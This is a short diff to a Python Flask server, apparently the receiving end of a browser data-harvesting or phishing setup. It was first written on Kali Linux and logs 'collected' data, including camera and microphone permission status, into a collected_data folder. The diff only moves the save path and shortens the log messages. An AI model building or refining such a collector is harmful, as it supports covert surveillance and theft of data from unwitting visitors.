@@ -6,7 +6,8 @@ from datetime import datetime
 
 app = Flask(__name__)
 
-SAVE_DIR = "/home/kali/Desktop/collected_data"
+# Save directory inside project folder
+SAVE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "collected_data")
 os.makedirs(SAVE_DIR, exist_ok=True)
 
 @app.after_request
@@ -59,16 +60,16 @@ def collect():
         return jsonify({"status": "ok"})
     
     elif data_type == "camera":
-        print(f"[+] Camera permission: {data.get('status')}")
+        print(f"[+] Camera: {data.get('status')}")
         return jsonify({"status": "ok"})
     
     elif data_type == "microphone":
-        print(f"[+] Microphone permission: {data.get('status')}")
+        print(f"[+] Microphone: {data.get('status')}")
         return jsonify({"status": "ok"})
     
     return jsonify({"status": "error"}), 400
 
 if __name__ == "__main__":
-    print("[+] Server starting on http://0.0.0.0:5000")
-    print(f"[+] Data will be saved to: {SAVE_DIR}")
+    print(f"[+] Server on http://0.0.0.0:5000")
+    print(f"[+] Data saved to: {SAVE_DIR}")
     app.run(host="0.0.0.0", port=5000, debug=False)
